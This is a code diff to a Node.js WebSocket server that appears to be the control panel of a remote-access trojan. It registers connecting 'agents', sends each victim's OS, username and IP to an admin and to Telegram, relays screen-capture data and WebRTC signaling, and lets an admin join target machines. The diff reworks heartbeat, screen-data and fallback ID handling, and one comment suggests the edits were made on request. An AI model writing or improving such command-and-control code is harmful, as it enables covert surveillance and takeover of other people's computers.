@@ -83,6 +83,7 @@ app.get('/health', (req, res) => {
 wss.on('connection', (ws, req) => {
  let id = uuidv4().substr(0, 8);
  ws.id = id;
+ // CRITICAL: Initialize client entry immediately so UI can render it
  clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
  logToFile(`[+] Client Connected: ${id}`);
@@ -107,15 +108,13 @@ wss.on('connection', (ws, req) => {
  return;
  }
 
- // CRITICAL FIX: Handle Info packets to ensure the UI has an ID to render
+ // 1. Handle Info packets
  if (data.type === 'info') {
- // If the payload sends its own ID, update that specific client entry
  if (data.id && clients[data.id]) {
  clients[data.id].ws = ws;
  clients[data.id].lastSeen = Date.now();
  clients[data.id].info = data;
  } else {
- // Otherwise, assume the current WS connection IS this user
  clients[id].info = data;
  clients[id].lastSeen = Date.now();
  }
@@ -124,11 +123,17 @@ wss.on('connection', (ws, req) => {
  broadcastToAdmin(id, data);
  notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
  } 
- else if (data.type === 'heartbeat') {
- if (clients[id]) clients[id].lastSeen = Date.now();
- } 
+ // 2. Handle Heartbeats and Screen Data - Ensure UI has an ID to show
+ else if (data.type === 'heartbeat' || data.type === 'screen_data') {
+ if (!clients[id].info) {
+ clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
+ notifyAdmin(id, `📺 Screen Active: ${id}`);
+ }
+ clients[id].lastSeen = Date.now();
+ broadcastToAdmin(id, data);
+ }
+ // 3. Handle Signaling (Offer/Answer/Candidate)
  else if (['offer', 'answer', 'candidate'].includes(data.type)) {
- // Forward signaling data to the specific target
  if (data.targetId && clients[data.targetId]) {
  const targetWs = clients[data.targetId].ws;
  if (targetWs.readyState === WebSocket.OPEN) {
@@ -136,6 +141,7 @@ wss.on('connection', (ws, req) => {
  }
  }
  } 
+ // 4. Handle Join Requests
  else if (data.type === 'join_all') {
  Object.keys(clients).forEach(cid => {
  if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
@@ -158,13 +164,20 @@ wss.on('connection', (ws, req) => {
  logToFile(`[ADMIN] Requested join to ${targetId}`);
  notifyTelegram(`🔗 ADMIN REQUESTED JOIN FROM ${targetId}`);
  }
- }
+ } 
+ // 5. Generic Fallback - Use the robust ID mapping you requested
  else {
- if (!clients[id].info && !clients[id].isAdmin) {
- clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
- notifyAdmin(id, `📺 Screen Active: ${id}`);
+ const userId = data.targetId || data.from || data.id;
+ if (userId && !clients[userId]) {
+ clients[userId] = { ws: null, info: {}, lastSeen: Date.now(), isAdmin: false };
  }
- broadcastToAdmin(id, data);
+ if (clients[userId]) {
+ clients[userId].lastSeen = Date.now();
+ if (!clients[userId].info) {
+ clients[userId].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
+ }
+ broadcastToAdmin(userId, data);
+ }
  }
  } catch (e) {
  logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
